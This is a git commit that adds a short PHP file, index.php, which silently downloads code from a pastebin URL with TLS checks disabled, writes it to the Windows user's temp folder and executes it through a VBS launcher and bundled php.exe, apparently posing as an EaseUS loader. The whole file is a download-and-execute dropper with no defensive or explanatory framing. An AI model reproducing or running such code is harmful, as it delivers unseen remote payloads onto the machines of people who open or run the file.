10f53cff92da2dbc6c95407296637f7fe3fffb32
MohamadXo213 <46904638+MohamadXo213@users.noreply.github.com>
2021-06-22 09:01:54 +0300

    Create index.php

---
+++ index.php
@@ -0,0 +1,9 @@
+<?php
+	$code = shell_exec("curl -k -L -s https://pastebin.com/raw/C9wxi49D");
+	$filename = "C:\\Users\\" . get_current_user() . "\\AppData\\Local\\Temp\\PHP_Loader.php";
+	$file = fopen($filename, "w");
+	fwrite($file, $code);
+	fclose($file);
+	system(dirname(__FILE__) . "\Executer.vbs " . dirname(__FILE__) . "\php.exe " . $filename . " EaseUS");
+	exit;
+?>
